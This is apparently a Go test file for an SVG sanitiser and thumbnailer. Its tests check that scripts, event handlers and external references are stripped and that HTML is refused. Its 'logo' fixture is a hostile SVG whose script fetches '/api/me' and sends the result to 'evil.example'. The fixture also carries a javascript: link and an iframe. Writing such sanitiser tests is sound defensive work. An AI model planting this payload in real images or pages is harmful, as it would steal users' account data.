package main

import (
	"bytes"
	"image/png"
	"strings"
	"testing"

	"github.com/ubgo/filesystem"
)

// logo is a drawing with everything an attacker adds to one.
const logo = `<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" onload="steal()">
  <script>fetch('/api/me').then(r => r.text()).then(t => new Image().src = 'https://evil.example/?' + t)</script>
  <a href="javascript:steal()"><rect width="64" height="64" fill="#2563eb"/></a>
  <foreignObject><iframe xmlns="http://www.w3.org/1999/xhtml" src="https://evil.example"/></foreignObject>
  <use href="https://evil.example/sprite.svg#icon"/>
</svg>`

func TestRun(t *testing.T) {
	var out strings.Builder
	if err := run(t.Context(), &out, []byte(logo), "logo.svg"); err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"removed   attribute onload", "removed   element script", "removed   element foreignObject", "image/svg+xml", `<rect width="64" height="64" fill="#2563eb">`, "raster    128x128 image/png"} {
		if !strings.Contains(out.String(), want) {
			t.Errorf("output lacks %q:\n%s", want, out.String())
		}
	}
	for _, bad := range []string{"steal", "evil.example", "<script", "<a"} {
		if strings.Contains(out.String()[strings.Index(out.String(), "stored"):], bad) {
			t.Errorf("stored document keeps %q:\n%s", bad, out.String())
		}
	}
	if err := run(t.Context(), &out, []byte(`<html><script>x</script></html>`), "page.svg"); err == nil {
		t.Fatal("an HTML page was stored")
	}
}

// TestRasterColour draws the sanitised logo and checks a pixel is its
// blue: the renderer drew the rectangle the sanitiser kept.
func TestRasterColour(t *testing.T) {
	res, err := thumbnail([]byte(`<svg xmlns="http://www.w3.org/2000/svg" width="64" height="32"><rect width="64" height="32" fill="#2563eb"/></svg>`), 64)
	if err != nil {
		t.Fatal(err)
	}
	img, err := png.Decode(bytes.NewReader(res.Data))
	if err != nil {
		t.Fatal(err)
	}
	r, g, b, _ := img.At(32, 16).RGBA()
	if res.Width != 64 || res.Height != 32 || r>>8 != 0x25 || g>>8 != 0x63 || b>>8 != 0xeb {
		t.Fatalf("raster %dx%d, centre pixel %x %x %x", res.Width, res.Height, r>>8, g>>8, b>>8)
	}
}

// TestRasterRefusesHTML pins that a document that is not SVG is not
// drawn.
func TestRasterRefusesHTML(t *testing.T) {
	if _, err := thumbnail([]byte(`<html><body>hi</body></html>`), 64); filesystem.CodeOf(err) != filesystem.CodeRejected {
		t.Fatalf("HTML drawn as SVG: %v", err)
	}
}
